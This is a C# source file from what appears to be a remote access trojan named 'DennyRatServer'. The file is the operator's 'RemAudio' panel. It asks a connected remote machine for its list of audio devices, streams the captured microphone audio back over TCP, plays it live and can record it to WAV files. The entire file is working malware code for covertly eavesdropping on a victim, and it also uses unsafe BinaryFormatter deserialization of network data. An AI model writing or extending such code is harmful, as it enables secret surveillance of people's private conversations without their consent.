using NAudio.Wave;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DennyRatServer
{
    public partial class RemAudio : Form
    {
        TcpClient cli;
        private NetworkStream mainStream;
        int inden = 0;
        bool keepStreaming = false;

        bool currentlystreaming = false;
        DirectSoundOut _waveOut;
        Thread streamerth;

        bool writeToFile = false;
        string flpath = "";
        private WaveFileWriter writer;

        public RemAudio(TcpClient ci)
        {
            cli = ci;
            InitializeComponent();
        }

        private void RemAudio_Load(object sender, EventArgs e)
        {
            RefreshSources();
        }

        private void RefreshSources()
        {
            listView1.Items.Clear();

            SendCommand("getaudsources");

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string stre = (string)binFormatter.Deserialize(mainStream);

            string[] allitems = stre.Split(new string[] { ":::" }, StringSplitOptions.RemoveEmptyEntries);

            foreach(string stritem in allitems)
            {
                string[] itmdesc = stritem.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries);
                ListViewItem item = new ListViewItem(itmdesc[0]);
                item.SubItems.Add(itmdesc[1]);
                item.SubItems.Add(itmdesc[2]);
                listView1.Items.Add(item);
            }

        }

        private void SendCommand(string command)
        {
            BinaryFormatter binFormatter = new BinaryFormatter();
            mainStream = cli.GetStream();
            binFormatter.Serialize(mainStream, command);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            RefreshSources();
        }

        private void startStreamingAudio()
        {
            while (keepStreaming)
            {
                SendCommand("startaudrecording" + inden.ToString());

                BinaryFormatter binFormatter = new BinaryFormatter();

                mainStream = cli.GetStream();

                try
                {
                    byte[] audstre = new byte[] { };
                    try
                    {
                        audstre = (byte[])binFormatter.Deserialize(mainStream);
                    }
                    catch
                    {
                        //Console.WriteLine("fuck");
                    }

                    try
                    {
                        if (!writeToFile)
                        {
                            IWaveProvider provider = new RawSourceWaveStream(new MemoryStream(audstre), new WaveFormat(48000, 16, 1));

                            if (currentlystreaming == false)
                            {
                                _waveOut = new NAudio.Wave.DirectSoundOut();

                                currentlystreaming = true;
                            }

                            _waveOut.Init(provider);
                            _waveOut.Play();
                        }
                        else
                        {
                            IWaveProvider provider = new RawSourceWaveStream(new MemoryStream(audstre), new WaveFormat(48000, 16, 1));

                            writer.WriteData(audstre, 0, audstre.Length);
                            writer.Flush();

                            if (currentlystreaming == false)
                            {
                                _waveOut = new NAudio.Wave.DirectSoundOut();

                                currentlystreaming = true;
                            }

                            _waveOut.Init(provider);
                            _waveOut.Play();
                        }
                    }
                    catch
                    {
                        //Console.WriteLine("unable");
                    }
                }
                catch
                {
                    //Console.WriteLine("bitch");
                }

                /*using (MemoryStream ms = new MemoryStream(audstre))
                {
                    // Construct the sound player
                    try
                    {
                        ms.Position = 0;
                        SoundPlayer player = new SoundPlayer(ms);
                        player.Play();
                    }
                    catch
                    {
                        Console.WriteLine("unabletoplay" + ms.ToArray()[0]);
                    }
                }*/
            }
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            base.OnClosing(e);
            keepStreaming = false;

        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count <= 0)
            {
                MessageBox.Show("No Audio Device Selected.");
                return;
            }

            if (button2.Text.ToLower().StartsWith("start"))
            {
                inden = int.Parse(listView1.SelectedItems[0].SubItems[2].Text);
                listView1.Enabled = false;
                keepStreaming = true;

                streamerth = new Thread(startStreamingAudio);
                streamerth.Start();

                button2.Text = "Stop Listening";
                return;
            }

            if (button2.Text.ToLower().StartsWith("stop"))
            {
                if (writeToFile)
                {
                    MessageBox.Show("You Must Stop Writing To File First");
                    return;
                }

                listView1.Enabled = true;
                keepStreaming = false;
                currentlystreaming = false;
                _waveOut.Dispose();

                button2.Text = "Start Listening";
                return;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (!currentlystreaming)
            {
                MessageBox.Show("Must Be Listening First");
                return;
            }

            if (button3.Text.ToLower().StartsWith("start"))
            {
                SaveFileDialog SaveFileDialog1 = new SaveFileDialog();
                SaveFileDialog1.DefaultExt = "wav";
                SaveFileDialog1.Filter = "audio files (*.wav)|*.wav|All files (*.*)|*.*";
                if (SaveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    flpath = SaveFileDialog1.FileName;
                    writeToFile = true;
                }
                else
                {
                    return;
                }
                writer = new WaveFileWriter(flpath, new WaveFormat(48000, 16, 1));

                MessageBox.Show("Writing Started at " + flpath);

                button3.Text = "Stop Record to File";
                return;
            }

            if (button3.Text.ToLower().StartsWith("stop"))
            {
                writeToFile = false;
                writer.Dispose();
                writer = null;

                MessageBox.Show("Writing Stopped at " + flpath);
                

                button3.Text = "Start Record to File";
                return;
            }
        }
    }
}
